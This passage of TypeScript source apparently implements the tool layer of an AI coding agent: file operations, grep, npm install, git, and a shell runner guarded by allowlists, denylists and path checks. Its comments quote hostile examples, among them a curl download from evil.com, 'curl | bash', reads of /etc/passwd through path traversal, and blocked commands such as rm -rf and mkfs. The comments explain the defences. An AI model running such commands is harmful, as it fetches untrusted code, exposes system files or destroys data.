    throw new Error("No search API key configured. Set BRAVE_SEARCH_API_KEY or SERPER_API_KEY.");
  }

  private async fetchWebContent(url: string) {
    const response = await safeAxiosGet(url, {
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
      responseType: 'text',
      maxHops: 5,
    });
    // Return a slice to avoid token overflow. Guard non-string bodies — JSON
    // responses arrive as objects when axios sniffs the content type.
    const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
    return body.slice(0, 10000);
  }

  private async readFile(filePath: string) {
    const fullPath = validatePath(filePath);
    const content = await fs.readFile(fullPath, 'utf-8');
    if (!isSensitivePath(fullPath)) {
      vectorService.addEntry(content.slice(0, 5000), { path: filePath, type: 'file_read' }).catch(err => logger.error(`[ToolService] addEntry (file_read) failed: ${err instanceof Error ? err.message : String(err)}`));
    }

    const MAX_FILE_CHARS = 8_000;
    if (content.length > MAX_FILE_CHARS) {
      return (
        content.slice(0, MAX_FILE_CHARS) +
        `\n\n[FILE TRUNCATED — ${content.length - MAX_FILE_CHARS} additional characters not shown. ` +
        `Use list_files to check the structure, or request a specific section of the file.]`
      );
    }
    return content;
  }

  private async writeFile(filePath: string, content: string) {
    const fullPath = validatePath(filePath);
    await fs.writeFile(fullPath, content);
    if (!isSensitivePath(fullPath)) {
      vectorService.addEntry(content.slice(0, 5000), { path: filePath, type: 'file_write' }).catch(err => logger.error(`[ToolService] addEntry (file_write) failed: ${err instanceof Error ? err.message : String(err)}`));
    }
    return { status: 'success', path: filePath };
  }

  private async listFiles(dirPath: string) {
    const fullPath = validatePath(dirPath);
    const files = await fs.readdir(fullPath, { withFileTypes: true });

    const MAX_ENTRIES = 150;
    const visible = files.slice(0, MAX_ENTRIES);
    const result = visible.map(f => ({
      name: f.name,
      type: f.isDirectory() ? 'directory' : 'file',
    }));
    if (files.length > MAX_ENTRIES) {
      result.push({
        name: `[${files.length - MAX_ENTRIES} more entries — use a subdirectory path to narrow results]`,
        type: 'file',
      });
    }
    return result;
  }

  private async getFileOutline(filePath: string): Promise<string> {
    const fullPath = validatePath(filePath);
    const content = await fs.readFile(fullPath, 'utf-8');
    const lines = content.split('\n');
    const outline: string[] = [];

    lines.forEach((line, idx) => {
      if (
        /^export\s+(?:default\s+)?(?:async\s+)?(?:function|class|const|let|var|type|interface|enum)\s+\w+/.test(line) ||
        /^(?:async\s+)?function\s+\w+/.test(line) ||
        /^class\s+\w+/.test(line)
      ) {
        outline.push(`${idx + 1}: ${line.trimEnd()}`);
      }
    });

    return outline.length > 0
      ? outline.join('\n')
      : `(no top-level exported symbols found in ${filePath})`;
  }

  private async grepFiles(
    pattern: string,
    searchPath?: string,
    include?: string,
    opts?: { literal?: boolean }
  ): Promise<string> {
    const effectiveRoot = getEffectiveProjectRoot();
    const basePath = searchPath ? validatePath(searchPath) : effectiveRoot;
    const includeGlob = include || '*.{ts,tsx,js,jsx,css,json,md}';
    const pathSep = process.platform === 'win32' ? '\\' : '/';
    const literal = opts?.literal === true;

    // Expand brace expressions (e.g. "*.{ts,tsx}") into multiple --include flags,
    // because spawn does not invoke a shell so brace expansion never happens.
    const includeArgs: string[] = [];
    const braceMatch = includeGlob.match(/^(.*)\{([^}]+)\}(.*)$/);
    if (braceMatch) {
      const [, prefix, inner, suffix] = braceMatch;
      (inner ?? '').split(',').forEach((ext) => {
        includeArgs.push(`--include=${prefix ?? ''}${ext}${suffix ?? ''}`);
      });
    } else {
      includeArgs.push(`--include=${includeGlob}`);
    }

    // On Windows, use findstr as fallback if grep is unavailable
    let bin: string;
    let binArgs: string[];
    if (process.platform === 'win32') {
      bin = 'findstr';
      binArgs = ['/s', '/n', literal ? '/l' : '/r', pattern, ...this.expandGlobForFindstr(includeGlob, basePath)];
    } else {
      bin = 'grep';
      binArgs = ['-rn', ...(literal ? ['-F'] : []), ...includeArgs, '--', pattern, basePath];
    }

    return new Promise((resolve) => {
      const proc = spawn(bin, binArgs, {
        cwd: effectiveRoot,
      });

      let output = '';
      proc.stdout.on('data', (d: Buffer) => { output += d.toString(); });
      proc.on('close', () => {
        if (!output.trim()) {
          resolve(`No matches found for "${pattern}"`);
          return;
        }
        const lines = output.trim().split('\n').slice(0, 30);
        const relativized = lines.map((l) => l.replace(effectiveRoot + pathSep, ''));
        const suffix = output.trim().split('\n').length > 30 ? '\n... (results truncated at 30)' : '';
        resolve(relativized.join('\n') + suffix);
      });
      proc.on('error', () => resolve(`No matches found for "${pattern}"`));
      setTimeout(() => { proc.kill(); resolve(output.trim() || 'Search timed out'); }, 10_000);
    });
  }

  private expandGlobForFindstr(glob: string, basePath: string): string[] {
    const extensions: string[] = [];
    const braceMatch = glob.match(/^(.*)\{([^}]+)\}(.*)$/);
    if (braceMatch) {
      const [, prefix, inner, suffix] = braceMatch;
      (inner ?? '').split(',').forEach((ext) => {
        extensions.push(path.join(basePath, `${prefix ?? ''}${ext}${suffix ?? ''}`));
      });
    } else {
      extensions.push(path.join(basePath, glob));
    }
    return extensions;
  }

  private async editFile(filePath: string, oldContent: string, newContent: string): Promise<{ status: string; path: string }> {
    const fullPath = validatePath(filePath);
    const fileContent = await fs.readFile(fullPath, 'utf-8');
    const occurrences = fileContent.split(oldContent).length - 1;

    if (occurrences === 0) {
      throw new Error(
        `edit_file: Could not find the specified old_content in ${filePath}. ` +
        `The text may have changed or there may be whitespace differences. ` +
        `Use read_file to verify the current content before retrying.`
      );
    }
    if (occurrences > 1) {
      throw new Error(
        `edit_file: old_content appears ${occurrences} times in ${filePath}. ` +
        `Provide more surrounding context to make it unique.`
      );
    }

    const updated = fileContent.replace(oldContent, newContent);
    await fs.writeFile(fullPath, updated, 'utf-8');
    return { status: 'success', path: filePath };
  }

  private async createFile(filePath: string, content: string): Promise<{ status: string; path: string }> {
    const fullPath = validatePath(filePath);
    try {
      await fs.access(fullPath);
      throw new Error(`create_file: ${filePath} already exists. Use write_file to overwrite or edit_file to modify it.`);
    } catch (e: unknown) {
      if ((e as NodeJS.ErrnoException).code !== 'ENOENT') throw e;
    }
    await fs.mkdir(path.dirname(fullPath), { recursive: true });
    await fs.writeFile(fullPath, content, 'utf-8');
    return { status: 'success', path: filePath };
  }

  private async deleteFile(filePath: string): Promise<{ status: string; path: string }> {
    const fullPath = validatePath(filePath);
    await fs.unlink(fullPath);
    return { status: 'success', path: filePath };
  }

  private async moveFile(from: string, to: string): Promise<{ status: string; from: string; to: string }> {
    const fromPath = validatePath(from);
    const toPath = validatePath(to);
    await fs.mkdir(path.dirname(toPath), { recursive: true });
    await fs.rename(fromPath, toPath);
    return { status: 'success', from, to };
  }

  private async replaceInFiles(
    pattern: string,
    replacement: string,
    glob?: string,
    searchPath?: string
  ): Promise<{ status: string; filesModified: number; files: string[] }> {
    // literal: the replacement below is a literal split/join, so the search
    // must be literal too — otherwise regex patterns find files the replace
    // step then can't touch.
    const grepResult = await this.grepFiles(pattern, searchPath || '.', glob || '*.{ts,tsx,js,jsx,css,json}', { literal: true });
    if (grepResult.startsWith('No matches') || grepResult.startsWith('Search timed')) {
      return { status: 'no_matches', filesModified: 0, files: [] };
    }

    const filePaths = [
      ...new Set(
        grepResult
          .split('\n')
          .filter((l) => !l.startsWith('...'))
          .map((l) => l.split(':')[0])
          .filter(Boolean)
      ),
    ];

    const modified: string[] = [];
    for (const fp of filePaths) {
      if (!fp) continue;
      try {
        const fullPath = validatePath(fp);
        const content = await fs.readFile(fullPath, 'utf-8');
        const updated = content.split(pattern).join(replacement);
        if (updated !== content) {
          await fs.writeFile(fullPath, updated, 'utf-8');
          modified.push(fp);
        }
      } catch {
        // skip unreadable files
      }
    }

    return { status: 'success', filesModified: modified.length, files: modified };
  }

  private spawnProcess(
    bin: string,
    args: string[],
    options: { cwd?: string; timeoutMs?: number }
  ): Promise<{ stdout: string; exitCode: number }> {
    return new Promise((resolve) => {
      // On Windows, commands like npm/npx/git are .cmd scripts that require shell
      const useShell = process.platform === 'win32';
      const proc = spawn(bin, args, { cwd: options.cwd ?? getEffectiveProjectRoot(), shell: useShell });
      let stdout = '';
      let resolved = false;
      const done = (result: { stdout: string; exitCode: number }) => {
        if (!resolved) { resolved = true; resolve(result); }
      };
      proc.stdout.on('data', (d: Buffer) => { stdout += d.toString(); });
      proc.stderr.on('data', (d: Buffer) => { stdout += d.toString(); });
      proc.on('close', (code) => done({ stdout, exitCode: code ?? 0 }));
      proc.on('error', (e: Error) => done({ stdout: e.message, exitCode: 1 }));
      const ms = options.timeoutMs ?? 30_000;
      setTimeout(() => { proc.kill(); done({ stdout: stdout + '\n[TIMED OUT]', exitCode: 1 }); }, ms);
    });
  }

  private async runTests(command?: string, cwd?: string): Promise<{ stdout: string; exitCode: number }> {
    const effectiveRoot = getEffectiveProjectRoot();
    // validatePath: a relative cwd like "../../" must not escape the project.
    const workDir = cwd ? validatePath(cwd) : effectiveRoot;
    const cmd = command || 'npx tsc --noEmit --pretty false';
    // spawnProcess uses shell:true on Windows — run_tests must pass the same
    // security policy as run_shell or it becomes an allowlist bypass.
    if (process.env.SOLVENT_ALLOW_SHELL !== 'true') {
      this.assertCommandAllowed(cmd);
    }
    const parts = cmd.split(/\s+/);
    const bin = parts[0] ?? 'npx';
    const binArgs = parts.slice(1);
    const { stdout, exitCode } = await this.spawnProcess(bin, binArgs, { cwd: workDir, timeoutMs: 30_000 });
    return { stdout: stdout.slice(0, 4096), exitCode };
  }

  private async getErrors(cwd?: string): Promise<{ errors: Array<{ file: string; line: number; col: number; message: string }>; count: number }> {
    const { stdout } = await this.runTests(undefined, cwd);
    const errorRegex = /^(.+\.tsx?)\((\d+),(\d+)\):\s+error\s+TS\d+:\s+(.+)$/gm;
    const errors: Array<{ file: string; line: number; col: number; message: string }> = [];
    let match: RegExpExecArray | null;
    while ((match = errorRegex.exec(stdout)) !== null && errors.length < 50) {
      const file = match[1] ?? '';
      const line = parseInt(match[2] ?? '0', 10);
      const col = parseInt(match[3] ?? '0', 10);
      const message = match[4] ?? '';
      errors.push({ file, line, col, message });
    }
    return { errors, count: errors.length };
  }

  private async installPackage(packages: string[], cwd?: string): Promise<{ status: string; packages: string[] }> {
    const effectiveRoot = getEffectiveProjectRoot();
    const workDir = cwd ? validatePath(cwd) : effectiveRoot;
    // Package args reach a shell-spawned npm on Windows — restrict to the npm
    // name/version charset and reject flag injection (leading '-').
    const SAFE_PACKAGE = /^(@[a-z0-9~][\w.-]*\/)?[a-z0-9~][\w.-]*(@[\w.^~<>=+*-]+)?$/i;
    for (const pkg of packages) {
      if (typeof pkg !== 'string' || pkg.startsWith('-') || !SAFE_PACKAGE.test(pkg)) {
        throw new Error(`install_package: invalid package name '${String(pkg).slice(0, 60)}'`);
      }
    }
    const { exitCode, stdout } = await this.spawnProcess('npm', ['install', ...packages], { cwd: workDir, timeoutMs: 120_000 });
    if (exitCode !== 0) throw new Error(`npm install failed: ${stdout.slice(0, 500)}`);
    return { status: 'success', packages };
  }

  private async gitStatus(): Promise<string> {
    const { stdout } = await this.spawnProcess('git', ['status', '--short'], {});
    return stdout.trim() || '(working tree clean)';
  }

  private async gitDiff(file?: string): Promise<string> {
    const args = file ? ['diff', '--', file] : ['diff'];
    const { stdout } = await this.spawnProcess('git', args, {});
    return stdout.length > 8000 ? stdout.slice(0, 8000) + '\n... (diff truncated)' : stdout || '(no changes)';
  }

  private async gitCommitAll(message: string): Promise<{ status: string; message: string }> {
    await this.spawnProcess('git', ['add', '-A'], {});
    const { exitCode, stdout } = await this.spawnProcess('git', ['commit', '-m', message], {});
    if (exitCode !== 0) throw new Error(`git commit failed: ${stdout.slice(0, 300)}`);
    return { status: 'success', message };
  }

  private async getProjectInfo(projectPath?: string): Promise<Record<string, unknown>> {
    const effectiveRoot = getEffectiveProjectRoot();
    const basePath = projectPath ? validatePath(projectPath) : effectiveRoot;
    try {
      const pkg = JSON.parse(await fs.readFile(path.join(basePath, 'package.json'), 'utf-8')) as {
        name?: string; version?: string; scripts?: Record<string, string>;
        dependencies?: Record<string, string>; devDependencies?: Record<string, string>;
      };
      const allDeps = { ...pkg.dependencies, ...pkg.devDependencies };
      const framework =
        allDeps.next ? 'Next.js' : allDeps['@remix-run/react'] ? 'Remix' :
        allDeps.react ? 'React' : allDeps.vue ? 'Vue' : allDeps.svelte ? 'Svelte' :
        allDeps.express ? 'Express' : allDeps.fastify ? 'Fastify' : 'Node.js';
      return {
        name: pkg.name, version: pkg.version, framework,
        scripts: pkg.scripts ?? {},
        dependencies: Object.keys(pkg.dependencies ?? {}),
        devDependencies: Object.keys(pkg.devDependencies ?? {}),
      };
    } catch {
      return { error: `No package.json found at ${projectPath ?? 'project root'}` };
    }
  }

  /**
   * Validate a command against the security policy: command-substitution
   * rejection, dangerous-pattern denylist, and per-stage allowlist + argv
   * checks. Shared by run_shell and run_tests so neither path can bypass the
   * policy. Callers gate on SOLVENT_ALLOW_SHELL themselves where opt-out is
   * intended.
   */
  private assertCommandAllowed(command: string): void {
    const normalizedCommand = command.trim().toLowerCase();

    // Reject command substitution — it hides commands from the allowlist.
    if (hasCommandSubstitution(command)) {
      throw new Error(
        `Command rejected by security policy: command substitution ($() or backticks) is not permitted.`
      );
    }

    // First, check for dangerous commands (always blocked)
    for (const dangerous of DANGEROUS_COMMANDS) {
      if (normalizedCommand.includes(dangerous.toLowerCase())) {
        throw new Error(
          `Command rejected by security policy: Contains dangerous pattern '${dangerous}'. Set SOLVENT_ALLOW_SHELL=true to enable arbitrary command execution (not recommended).`
        );
      }
    }

    // Validate every pipeline stage's first token against the allowlist, and
    // track a simulated cwd across chained stages so `cd` can't be used to
    // walk the *real* shell's cwd outside the project root before a later
    // stage reads/writes relative to it (e.g. `cd .. && cat ../../secret`).
    // Every stage's own arguments and redirect targets are also resolved
    // against that simulated cwd and rejected if they'd escape the root,
    // which also blocks single-stage traversal with no `cd` at all
    // (e.g. `cat ../../../etc/passwd`).
    let simulatedCwd = getEffectiveProjectRoot();
    for (const stage of splitPipelineStages(command)) {
      const stageLower = stage.toLowerCase();
      const allowed = ALLOWED_COMMAND_PREFIXES.some(prefix =>
        stageLower.startsWith(prefix.toLowerCase()) || stageLower === prefix.trim().toLowerCase()
      );
      if (!allowed) {
        throw new Error(
          `Command rejected by security policy: pipeline stage '${stage.substring(0, 50)}${stage.length > 50 ? '...' : ''}' is not in the allowlist. Allowed commands: ${ALLOWED_COMMAND_PREFIXES.join(', ')}.`
        );
      }
      rejectDangerousArgv(stage);

      const cdMatch = /^cd(?:\s+(.*))?$/i.exec(stage.trim());
      if (cdMatch) {
        const arg = (cdMatch[1] ?? '').trim();
        // Bare `cd`, `cd -`, and `cd ~` all resolve via $HOME/$OLDPWD in a
        // real shell — none of which we control or can validate here — so
        // they're rejected outright rather than risking an untracked escape.
        if (!arg || arg === '-' || arg === '~' || arg.startsWith('~/')) {
          throw new Error(
            `Command rejected by security policy: 'cd' with no argument (or '~'/'-') is not permitted — it may resolve outside the project root via $HOME.`
          );
        }
        const resolved = path.resolve(simulatedCwd, arg);
        if (!isPathWithinRoot(resolved)) {
          throw new Error(
            `Command rejected by security policy: 'cd ${arg}' would move outside the permitted project root.`
          );
        }
        simulatedCwd = resolved;
        continue;
      }

      assertStageArgsWithinRoot(stage, simulatedCwd);
    }
  }

  /**
   * Executes a shell command with security restrictions.
   *
   * Security measures:
   * 1. Uses explicit allowlist of permitted command prefixes (not a denylist)
   * 2. Blocks dangerous commands (rm -rf, mkfs, dd, sudo, etc.)
   * 3. Uses spawn with argument array (shell: false) to prevent shell interpolation
   * 4. Sets NO_COLOR=1 environment variable
   * 5. Restricts working directory to PROJECT_ROOT
   *
   * Known limitations:
   * - The allowlist is prefix-based. A command like `curl http://evil.com/payload`
   *   passes the `curl ` prefix check. The DANGEROUS_COMMANDS list mitigates the
   *   most common pipe-based exfiltration patterns (e.g. `curl | bash`), but is
   *   not exhaustive. Set SOLVENT_ALLOW_SHELL=false in production to disable shell
   *   execution entirely if the feature is not needed.
   * - Command arguments are split on whitespace only; quoted arguments with spaces
   *   are not handled correctly (e.g. `grep "foo bar" file.txt` will break).
   */
  private async runShell(command: string): Promise<{ stdout: string; stderr: string }> {
    // Check if arbitrary shell execution is explicitly enabled
    const allowArbitraryShell = process.env.SOLVENT_ALLOW_SHELL === 'true';

    // Reject long-running dev-server commands — they never exit and would
    // hang the tool loop. The agent should use ide_run_in_sandbox (WebContainer)
    // for dev servers, not the backend shell.
    //
    // IMPORTANT: only match when the dev-server name is the *command being
    // invoked*, not when it appears inside an argument path. `ls
    // node_modules/.bin/vite` must be allowed, otherwise the agent cannot
    // verify that ghost `npm install` runs actually produced the binary.
    // We split on pipeline operators and check each stage's leading token.
    const stages = splitPipelineStages(command);
    const devServerStagePatterns = [
      /^npm(?:\.cmd)?\s+(?:run\s+)?(?:dev|start|serve|watch|preview)\b/i,
      /^yarn(?:\.cmd)?\s+(?:dev|start|serve|watch|preview)\b/i,
      /^pnpm(?:\.cmd)?\s+(?:run\s+)?(?:dev|start|serve|watch|preview)\b/i,
      // `vite` / `vite --host` / `./node_modules/.bin/vite` — but NOT
      // `vite build`, and NOT `ls path/to/vite` (which begins with `ls`).
      /^(?:\.?\/[^\s]*\/)?(?:npx\s+)?vite(?:\s+(?!build\b)|$)/i,
      /^(?:npx\s+)?next\s+(?:dev|start)\b/i,
      /^(?:npx\s+)?nodemon\b/i,
      /^(?:npx\s+)?tsx\s+watch\b/i,
      /^(?:npx\s+)?nuxt\s+(?:dev|preview)\b/i,
      // `node_modules/.bin/vite ...` as the literal command.
      /^node_modules\/\.bin\/(?:vite|next|nodemon|nuxt)(?:\s|$)/i,
    ];
    const offendingStage = stages.find(stage => devServerStagePatterns.some(re => re.test(stage)));
    if (offendingStage) {
      throw new Error(
        `Command rejected: '${offendingStage.substring(0, 60)}' looks like a long-running dev server, which will hang the tool loop. Use the 'ide_run_in_sandbox' tool (WebContainer) to start dev servers, or ask the user to click the Run button in the coding panel.`
      );
    }

    if (!allowArbitraryShell) {
      this.assertCommandAllowed(command);
    }

    // Windows shell routing: prefer git-bash if present (agent writes POSIX
    // shell — `&` backgrounds, `$!`, `sleep`, `|| echo`, `/dev/null`, etc.
    // — none of which cmd.exe handles correctly). Fall back to cmd /c with
    // a narrow POSIX→cmd translation when git-bash isn't installed.
    const useShell = hasShellMetacharacters(command);
    let executable: string;
    let args: string[];
    let overridePath: string | null = null;
    if (process.platform === 'win32') {
      if (WIN_BASH_PATH) {
        // Spawn git-bash by absolute path. Keep the cwd Windows-style —
        // CreateProcess requires it, and git-bash handles Windows paths
        // (and POSIX ones) natively once it's running.
        executable = WIN_BASH_PATH;
        args = ['-c', command.trim()];
        // Prepend git-bash's bin to PATH so shimmed binaries (npm, node,
        // etc. that live in Git's msys layout) resolve inside the shell.
        overridePath = path.dirname(WIN_BASH_PATH) + path.delimiter + (process.env.PATH ?? '');
      } else {
        executable = 'cmd';
        args = ['/c', translatePosixShellismsForWindows(command.trim())];
      }
    } else if (useShell) {
      executable = '/bin/sh';
      args = ['-c', command.trim()];
    } else {
      const parts = command.trim().split(/\s+/);
      const first = parts[0];
      if (!first) return Promise.reject(new Error('Empty command'));
      executable = first;
      args = parts.slice(1);
    }

    return new Promise((resolve, reject) => {
      const spawnEnv: NodeJS.ProcessEnv = {
        ...process.env as NodeJS.ProcessEnv,
        NO_COLOR: '1',
      };
      if (overridePath) spawnEnv.PATH = overridePath;
      const proc = spawn(executable, args, {
        cwd: getEffectiveProjectRoot(),
        env: spawnEnv,
        shell: false,
        stdio: ['pipe', 'pipe', 'pipe']
      });

      if (!proc.stdout || !proc.stderr) {
        return reject(new Error('Failed to open stdio streams'));
      }

      const child = {
        stdout: proc.stdout,
        stderr: proc.stderr,
        on: proc.on.bind(proc)
      };

      let stdout = '';
      let stderr = '';
      let stdoutTruncated = false;
      let stderrTruncated = false;
      let timedOut = false;

      // Kill any command that runs longer than 3 minutes — protects against
      // unexpected long-runners that slipped past the dev-server pattern check.
      const TIMEOUT_MS = 180_000;
      const timer = setTimeout(() => {
        timedOut = true;
        proc.kill();
      }, TIMEOUT_MS);

      // Cap accumulated output — a verbose command (npm install, git log -p)
      // can otherwise grow these strings unboundedly until the 3-minute
      // timeout fires, putting memory pressure on the whole backend process.
      const MAX_OUTPUT_BYTES = 512 * 1024; // 512KB per stream

      child.stdout.on('data', (data: Buffer) => {
        if (stdout.length < MAX_OUTPUT_BYTES) {
          stdout += data.toString();
        } else if (!stdoutTruncated) {
          stdout += '\n... (stdout truncated at 512KB)';
          stdoutTruncated = true;
        }
      });

      child.stderr.on('data', (data: Buffer) => {
        if (stderr.length < MAX_OUTPUT_BYTES) {
          stderr += data.toString();
        } else if (!stderrTruncated) {
          stderr += '\n... (stderr truncated at 512KB)';
          stderrTruncated = true;
        }
      });

      child.on('error', (err: Error) => {
        clearTimeout(timer);
        reject(new Error(`Command execution failed: ${err.message}`));
      });

      child.on('close', (code: number | null) => {
        clearTimeout(timer);
        if (timedOut) {
          reject(new Error(`Command timed out after ${TIMEOUT_MS / 1000}s and was killed. Partial stdout:\n${stdout.slice(-500)}`));
        } else if (code === 0) {
          resolve({ stdout, stderr });
        } else {
          reject(new Error(`Command exited with code ${code}\n${stderr}`));
        }
      });
    });
  }
}

export const toolService = new ToolService();
